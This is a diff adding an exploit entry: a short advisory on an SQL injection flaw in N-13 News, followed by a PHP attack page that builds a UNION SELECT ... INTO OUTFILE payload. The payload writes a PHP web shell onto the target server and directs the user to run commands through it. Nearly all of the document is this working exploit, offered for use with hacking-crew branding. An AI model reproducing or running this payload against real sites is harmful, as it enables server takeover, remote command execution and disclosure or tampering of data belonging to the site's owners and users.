@@ -1,0 +1,62 @@
+source: http://www.securityfocus.com/bid/15643/info
+
+N-13 News is prone to an SQL injection vulnerability.
+
+Successful exploitation could result in a compromise of the application, disclosure or modification of data, or may permit an attacker to exploit vulnerabilities in the underlying database implementation.
+
+All versions of N-13 News are considered to be affected at the moment.
+
+<?php
+
+###             0 day -- 29/11/2005
+###
+###     N-13 News Remote SQL / PHP-Shell Injection
+###
+###     Just upload in a web-server with mod_php
+###     and run it trhough your browser ;)
+###
+###     Affected Software : http://network-13.com/  N-13 News
+###     Version: All
+###     Exploit discovere and written by: KingOfSka @ http://contropotere.altervista.org
+###     Condition: Magic Quotes OFF
+###                A world writeable directory accessible trough HTTP
+###     To detect Server Path to N-13 just visit: http://www.site.com/n13/index.php?id=0'
+###
+?>
+<html>
+<head>
+<title> .::KingOfSka N-13 News Remote PHP Shell Injection::. || http://contropotere.altervista.org || </title>
+</head>
+<body>
+<header> .::KingOfSka N-13 News PHP Shell Injection::. || <a href = "http://contropotere.altervista.org/limbo/"> Contro Potere Hacking Crew </a> || </header> <br />
+<br />
+<?php
+if (isset($_POST['url'])) {
+$url = $_POST['url'];
+$path2news = $_POST['path2news'];
+$outfile = $_POST ['outfile'];
+$sql = "0' UNION SELECT '0' , '<? system(\$_GET[cpc]);exit; ?>' ,0 ,0 ,0 ,0 INTO OUTFILE '$outfile";
+$sql = urlencode($sql);
+$expurl= $url."?id=".$sql ;
+echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';
+echo "After clicking go to http://www.site.com/path2phpshell/shell.php?cpc=ls to see results";
+}
+else
+{
+?>
+Url to index.php: <br />
+<form action = "<?php echo "$_SERVER[PHP_SELF]" ; ?>" method = "post">
+<input type = "text" name = "url" value = "http://www.site.com/n13/index.php" size = "50"> <br />
+Server Path to Shell: <br />
+Full server path to a writable file which will contain the Php Shell <br />
+<input type = "text" name = "outfile" value = "/var/www/localhost/htdocs/n13/shell.php" size = "50"> <br /> <br />
+<input type = "submit" value = "Create Exploit"> <br /> <br />
+
+
+
+<?php
+}
+?>
+</body>
+</html>
+
